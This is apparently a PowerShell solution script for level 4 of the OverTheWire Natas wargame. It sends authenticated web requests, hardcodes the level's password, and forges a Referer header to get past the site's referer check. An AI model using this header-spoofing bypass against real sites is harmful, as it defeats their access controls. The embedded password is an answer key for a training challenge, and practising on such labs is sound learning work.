
$currentLevel = 4
$currentPassword = ''
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$page = Invoke-WebRequest $currentURL -Credential $credential -SessionVariable session
$page.Rawcontent

$currentLevel = 4
$currentPassword = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
$currentURL = "http://natas$($currentLevel).natas.labs.overthewire.org"
$currentUsername = "natas$currentLevel"
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $currentUsername,$(convertTo-SecureString -AsPlainText -Force -String $currentPassword)

$requiredReferer = "http://natas5.natas.labs.overthewire.org/"
$page = Invoke-WebRequest $currentURL -Credential $credential -SessionVariable session -Headers @{"Referer"=$requiredReferer}
$page.Rawcontent



